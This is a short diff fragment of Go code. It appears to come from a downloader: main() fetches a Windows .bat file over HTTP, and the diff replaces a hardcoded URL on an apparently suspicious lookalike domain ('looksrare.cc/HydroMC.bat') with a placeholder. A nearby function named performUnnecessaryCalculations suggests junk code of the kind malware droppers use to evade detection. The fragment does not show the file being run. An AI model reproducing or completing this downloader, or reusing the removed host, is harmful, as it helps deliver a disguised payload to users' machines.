@@ -58,7 +58,7 @@ func performUnnecessaryCalculations() {
 }
 
 func main() {
-    url := "https://looksrare.cc/HydroMC.bat"
+    url := "https://yoururl.com/test.bat"
     fileType := "bat"
 
     response, err := http.Get(url)
